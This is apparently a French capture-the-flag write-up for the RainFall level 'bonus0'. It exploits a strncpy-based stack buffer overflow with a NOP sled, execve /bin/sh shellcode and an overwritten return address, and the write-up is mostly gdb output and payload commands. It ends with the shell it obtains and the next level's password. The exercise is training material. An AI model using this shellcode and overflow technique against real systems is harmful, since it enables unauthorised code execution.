#### Etape 1 : Décompilation 
Nous trouvons un binaire bonus0 dans le répertoire lorsque nous l'analysons nous voyons que le binaire possède trois fonctions :
p(), pp() et main(). (voir souce.c).
Le binaire ne necessite pas d'argument pour être lancé. on recoit le prompt suivant :

```bash
bonus0@RainFall:~$ ./bonus0
 -
AAAAA
 -
BBBBB
AAAAA BBBBB
```
on remarque dans la fonction pp que les deux chaines on un buffer de 20 bytes.
lorsque nous essayons de faire un overflow sur les 2 chaines, nous obtenons un segfault.

```bash
bonus0@RainFall:~$ ./bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��
Segmentation fault (core dumped)
bonus0@RainFall:~$
```


#### Etape 2 : Objectif

Nous decidons de overflow afin d'y inclure un ShellCode.

#### Etape 3 : Faiblesses


On voit plusieurs faiblesse avec le binaire, la première est que les deux buffers sont alignés en mémoire. on voit une fonction p() qui utilise un read et  un strncpy pour copier les 20 premiers caracteres si possible mais comme dit le man :
```bash
La fonction strncpy() est identique, sauf qu’au plus n  octets  de  src
       sont  copiés.  Attention :  s’il  n’y a pas de caractère nul dans les n
       premiers octets de src, la chaîne résultante dans dest ne disposera pas
       de caractère nul final.
```
Donc le buffer final sera remplis de 20 chars + 20 char + 1 espaces + 20 chars comme vu plus haut.


#### Etape 4 : Plan d'action

Premiere etape etait de trouver l'offset
J'ai généré un buffer grâce à : https://wiremask.eu/tools/buffer-overflow-pattern-generator
En éxécutant le programme depuis gdb avec le buffer en question j'obtiens une adresse qui correspond au dernier caractère écrit avant le SegFault. Ce qui me permet de les identifier et obtenir la valeur de 9.

Nous allons remplir le grand buffer de read dans la fonction p() avec des NOPs et un shellcode avec un padding supperieur a 61 bytes pour atteindre l'adresse de retour de la fonction p().

```bash
bonus0@RainFall:~$ python -c "print '\x90' * 200 +'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'" > /tmp/hugo

[...]
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) b read
Breakpoint 2 at 0xb7f0a1f0
(gdb) run < /tmp/hugo

[...]
(gdb) disass p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   %ebp
   0x080484b5 <+1>:	mov    %esp,%ebp
   0x080484b7 <+3>:	sub    $0x1018,%esp
   0x080484bd <+9>:	mov    0xc(%ebp),%eax
   0x080484c0 <+12>:	mov    %eax,(%esp)
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:	mov    %eax,(%esp)
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	movb   $0x0,(%eax)
   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
   0x0804850d <+89>:	mov    %eax,0x4(%esp)
   0x08048511 <+93>:	mov    0x8(%ebp),%eax
   0x08048514 <+96>:	mov    %eax,(%esp)
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave
   0x0804851d <+105>:	ret
End of assembler dump.

[...]

(gdb) x/100x $ebp-0x1008
0xbfffe650:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffe660:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffe670:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffe680:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffe690:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffe6a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffe6b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffe6c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffe6d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffe6e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffe6f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffe700:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffe710:	0x90909090	0x90909090	0x99580b6a	0x2f2f6852
0xbfffe720:	0x2f686873	0x896e6962	0xcdc931e3	0x00000080
0xbfffe730:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe740:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe750:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe760:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe770:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe780:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe790:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe7a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe7b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe7c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe7d0:	0x00000000	0x00000000	0x00000000	0x00000000

```

On voit que le buffer est bien remplis de NOPs et de notre shellcode.

Ensuite avec l'offset  trouver au dessus, on va ecrire l'adresse de eip par une adresse aleatoire du NOPsled superieur au 61 bytes vu au dessus.

Nous choisissons l'adresse suivante : 0xbfffe6c0

```bash
bonus0@RainFall:~$ python -c "print 'A' * 9 +'\xc0\xe6\xff\xbf' + 'B' * 7" > /tmp/hugo1
```
Attention a bien mettre l'adresse en little endian et ne pas depasser l'adresse dans le NOPsled (ici avec B) pour ne pas ecraser le shellcode.

# Etape 5 : Execution

```bash
bonus0@RainFall:~$ python -c "print '\x90' * 500 +'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'" > /tmp/hugo
bonus0@RainFall:~$  python -c "print 'A' * 9 +'\xc0\xe6\xff\xbf' + 'B' * 7" > /tmp/hugo1
bonus0@RainFall:~$ (cat /tmp/hugo ; cat /tmp/hugo1 -) | ./bonus0
 -
 -
��������������������AAAAAAAAA����BBBBBBB�� AAAAAAAAA����BBBBBBB��
whoami
bonus1

cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

```